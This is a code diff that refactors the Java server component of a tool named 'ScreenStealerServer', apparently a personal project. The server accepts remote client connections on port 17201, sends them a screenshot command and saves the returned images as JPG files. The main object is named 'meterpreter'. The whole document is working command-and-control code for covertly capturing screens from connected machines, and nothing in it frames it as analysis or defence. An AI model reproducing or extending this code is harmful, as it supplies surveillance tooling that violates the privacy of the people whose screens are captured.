@@ -7,42 +7,57 @@ import java.io.ObjectInputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
 
 abstract class pRes {
-	
-	public static ArrayList<Session> sessionList;
-	
+
+	public static List<Session> sessionList;
+
 	public static ServerSocket serverSocket;
 	public static final int LISTEN_PORT = 17201;
-
-	public static Socket clientSocket;
-	public static DataOutputStream dos;
-	public static ObjectInputStream ois;
 }
 
 abstract class Cmd {
-	
+
 	public static final String TAKE_SCREEN_SHOT = "TSS";
 }
 
-class EventManager {
-	
-	public void capture() {
-		
+class CaptureManager {
+
+	private DataOutputStream dos;
+	private ObjectInputStream ois;
+	private String fileName;
+
+	private static class Singleton {
+		static CaptureManager INSTANCE = new CaptureManager();
+	}
+
+	public static CaptureManager getInstance() {
+		return Singleton.INSTANCE;
+	}
+
+	public void capture(DataOutputStream dos, ObjectInputStream ois) {
+		setStream(dos, ois);
+
 		if (!sendCommand(Cmd.TAKE_SCREEN_SHOT))
 			return;
 
 		byte[] screenCaptureByteArray = getScreenCaptureByteArray();
-		if (screenCaptureByteArray == null) 
+		if (screenCaptureByteArray == null)
 			return;
-		
+
 		update(screenCaptureByteArray);
 	}
 
+	private void setStream(DataOutputStream dos, ObjectInputStream ois) {
+		this.dos = dos;
+		this.ois = ois;
+	}
+
 	private boolean sendCommand(String cmd) {
-		
 		try {
-			pRes.dos.writeUTF(cmd);
+			dos.writeUTF(cmd);
 			return true;
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -51,9 +66,8 @@ class EventManager {
 	}
 
 	private byte[] getScreenCaptureByteArray() {
-		
 		try {
-			return (byte[]) pRes.ois.readObject();
+			return (byte[]) ois.readObject();
 		} catch (Exception e) {
 			e.printStackTrace();
 			return null;
@@ -61,7 +75,6 @@ class EventManager {
 	}
 
 	private boolean update(byte[] captureImage) {
-		
 		try {
 			String randomFileName = "" + System.currentTimeMillis() + ".jpg";
 			FileOutputStream fos = new FileOutputStream(randomFileName);
@@ -75,39 +88,25 @@ class EventManager {
 			return false;
 		}
 	}
-	
-	private boolean sendMessage(String msg) {
-		
-		return sendCommand(msg);
-	}
 }
 
 class Session implements Runnable {
-	
+
 	private String ip;
+	private DataOutputStream dos;
+	private ObjectInputStream ois;
 
-	@Override
-	public void run() {
-		
-		if (!getStream())
+	public Session(Socket sessionSocket) {
+		if (!getStream(sessionSocket))
 			return;
-		
-		getIpAddress();
-
-		
-	}
-	
-	private void getIpAddress() {
-
-		ip = pRes.clientSocket.getInetAddress().getHostAddress();
-		System.out.println("연결되었습니다\nIP : " + ip);		
 	}
 
-	private boolean getStream() {
-		
+	private boolean getStream(Socket sessionSocket) {
 		try {
-			pRes.dos = new DataOutputStream(pRes.clientSocket.getOutputStream());
-			pRes.ois = new ObjectInputStream(pRes.clientSocket.getInputStream());
+			dos = new DataOutputStream(sessionSocket.getOutputStream());
+			ois = new ObjectInputStream(sessionSocket.getInputStream());
+			ip = sessionSocket.getInetAddress().getHostAddress();
+			System.out.println("새로운 세션 : IP : " + ip);
 
 			return true;
 		} catch (Exception e) {
@@ -115,12 +114,24 @@ class Session implements Runnable {
 			return false;
 		}
 	}
+
+	@Override
+	public void run() {
+		getIpAddress();
+	}
+
+	private void getIpAddress() {
+
+	}
+
+	private void waitForInterrupt() throws Exception {
+		Thread.sleep(200);
+	}
 }
 
 public class ScreenStealerServer {
 
 	public void activate() {
-		
 		if (!initServer())
 			return;
 
@@ -128,9 +139,9 @@ public class ScreenStealerServer {
 	}
 
 	private boolean initServer() {
-		
 		try {
 			pRes.serverSocket = new ServerSocket(pRes.LISTEN_PORT);
+			pRes.sessionList = Collections.synchronizedList(new ArrayList<>());
 			return true;
 		} catch (IOException e) {
 			System.out.println("포트가 이미 사용중입니다.");
@@ -139,19 +150,17 @@ public class ScreenStealerServer {
 	}
 
 	private void acceptClient() {
-		
 		while (true) {
 			try {
-				pRes.clientSocket = pRes.serverSocket.accept();
-				new Thread(new Session()).start();
+				Socket sessionSocket = pRes.serverSocket.accept();
+				new Thread(new Session(sessionSocket)).start();
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
 		}
 	}
-	
+
 	public static void main(String[] args) {
-		
 		ScreenStealerServer meterpreter = new ScreenStealerServer();
 		meterpreter.activate();
 	}
